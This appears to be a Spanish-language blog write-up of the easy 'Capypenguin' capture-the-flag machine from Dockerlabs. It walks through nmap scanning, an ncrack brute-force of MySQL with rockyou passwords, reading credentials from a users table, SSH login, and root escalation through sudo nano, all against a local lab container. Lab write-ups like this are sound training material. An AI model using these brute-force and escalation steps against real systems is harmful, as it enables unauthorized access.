---
layout: post
author: Quino
title: Capypenguin , DOCKERLABS
---

Este es un reto clasificado como de dificultad facil de la plataforma [Dockerlabs](https://dockerlabs.es "dockerlabs").

Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , revisar la web y su codigo , fuerza bruta contra mysql , revisar las bbdd y escalada

## HERRAMIENTAS Y RECURSOS USADOS

- nmap
- ncrack
-searchbins

## Enumeracion

Como al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.

```bash

ping -c1 172.17.0.2

```

Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.

```bash
sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv  172.17.0.2 -oX puertos
```

[Reporte](r3p0rt3s/capipenguin_nmap.html "Reporte nmap")

Observamos el resultado y vemos que solo tiene el ssh 22, el http 80, y el 3306 de mysql.

Empecemos por revisar la web no se pq motivo a mi me carga de forma incorrecta y leyendo el codigo veo lo siguiente (eso tambien deberia de verse de forma visual o eso creo).

![codigoweb](assets/capypenguin/webuser.png)

Como se entiende a la perfecion creo que no hace falta explicarlo tenemos al usuario capybarauser y la pass en el final del rockyou

> Ademas nos tira un comando a usar

Yo me voy a llevar las ultimas 100000 lineas del rockyou par empezar con la fuerza bruta y si no seran  1000000 , porque este que tengo lo destripe un par de veces y la cage.

```bash
tail --lines 100000 ../../../rockyou.txt > 1000.txt
```

Ahora ya con el mini rock podemos empezar el ataque , si el usuario lo hubiese extraido de otro lugar haria fuerza bruta tanto a ssh como a mysql pero nos lo ha dado la web asi que vamos primero contra mysql.

OJO PARECE QUE SE BLOQUEA LA BASE DE DATOS

![flush_user](assets/capypenguin/mysqlerror.png) 

```bash
ncrack -u capybarauser -P Maquinas_hack/Dockerlabs.es/capypenguin/1000.txt 172.17.0.2:3306 mysql
```

![ncark](assets/capypenguin/ncrakmysql.png)

## Infiltración

Llego la hora de mandarnos a la base de datos.

```bash
mysql -h 172.17.0.2 -u capybarauser -p
```
Listamos las bases de datos

```bash
SHOW DATABASES;
```

![BBDD](assets/capypenguin/showddbb.png)

Le indicamos cual queremos cargar y tambien que nos la muestre

```bash
USE pinguinasio_db;
```

```bash
SHOW TABLES;
```

![tables](assets/capypenguin/showtables.png)

Y por ultimo y para visualizar el contenido de la tabla ejecutamos

```bash
SELECT * FROM users;
```

![passbbdd](assets/capypenguin/selectdb.png)

Ya tenemos un usario y contraseña a probar ssh

## Escalada de privilegios
  
Una vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.

```bash
find / -perm -4000 2>/dev/null
sudo -l
```

![salida_sudo](assets/capypenguin/sudo.png)


Sudo nos arroja el binario nano disponible para escalar hasta root.

Lo buscamos en searchbins para saber como ejecutarlo y nos hacemos root

![searchbins](assets/capypenguin/searchbins.png)

Nano no se lleva bien 

![error](assets/capypenguin/errorkitty.png)

Lo soluciono cambiando de terminal

![root](assets/capypenguin/root.png)


Gracias por leer

